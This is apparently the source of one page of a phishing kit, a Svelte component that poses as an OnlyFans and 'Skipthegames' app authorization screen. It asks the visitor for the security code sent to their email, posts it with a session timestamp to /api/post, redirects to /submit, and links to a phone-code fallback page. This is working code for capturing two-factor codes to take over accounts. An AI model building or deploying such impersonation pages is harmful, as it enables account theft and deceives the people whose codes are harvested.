<script context="module">
    export function load({ url }) {
        let query = url.searchParams;
        return {
            props: {
                timestamp: query.get("t"),
            },
        };
    }
</script>

<script>
    import { onMount } from "svelte";
    import { goto } from "$app/navigation";

    async function put() {
        console.log('pin',pin);
        let res=await fetch("/api/post", {
            method: "PUT",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                pin:pin,
                timestamp:timestamp
            }),
        });
        let val=await res.json()
        console.log('res',val)
        goto("/submit");
    }
    let pin = "";

    export let timestamp;
</script>


<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.0/font/bootstrap-icons.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;600&display=swap" rel="stylesheet">
    <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
 integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
 <link rel="stylesheet" href="page2.css">

</svelte:head>
<body>
   <nav>
       <div class="logo">
           <img src="images/page2-logo.png" alt="">
       </div>
       <div class="ancore">
           <a href="#">Sign in for OnlyFans ></a>
       </div>
       
   </nav>
    <div class="custom-container">
        <div class="box">
            <div class="mini-box">
                      <div class="first-look">
                    <div class="heading">
                        <h4>Authorize OnlyFans to access your account?</h4>
                    </div>
                    <div class="submit-opstion">
                        <h4>Security Check</h4>
                        <p style="margin-top: 10px;">A security code has been sent to your email address
                            Please enter the code here</p>
                        <input type="password" placeholder=" security-code" bind:value={pin}> <br>
                        <button type="button" on:click={put}><b>submit</b></button>
                        <p style="margin-top: 10px;">The code you received is good for 30 minutes 
                            It may take the code up to 10 minutes or so to arrive <br> Make sure to check your Spam/Junk/Trash folder</p>

                        <p>if you don't get the code <a href={'/phone?t='+timestamp}>click here</a></p>

                        
                    </div>
                </div>
                     
            </div>
        
            <div class="service">
                <h6>This application will be able to:</h6>
            </div>
            <div class="unorder-list">
                <ul>
                    <li>See Skipthegames from your timeline (including protected Text) as well as your Lists and collections.</li>
                    <li>See your skipthegames profile information and account settings. See accounts you follow, mute, and block.</li>
                    <li>Follow and unfollow accounts for you</li>
                    <li>Update your profile and account settings.</li>
                    <li>Post and delete Text for you, and engage with Text posted by others (Like, un-Like, or reply to a Text, Retext, etc.) for you.</li> 
                     
                    <li>Create, manage, and delete Lists and collections for you</li>
                    <li>Mute, block, and report accounts for you</li>
                    <li>See your email address.</li>
                    
                </ul>
                <p class="simple-text">Learn more about third-party app permissions in the <a href="#">Help Center</a></p>
            </div>
        
       
        
    

</div>


</div>
<footer>
<div class="custom-containerr">
    <div class="footer-text">
        <p class="big-text">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your skipthegames account.
         You can revoke access to any app at any time from the <span>Apps and sessions</span>  section of your skipthegames account settings.</p>
        
    </div>

</div>
</footer>
</body>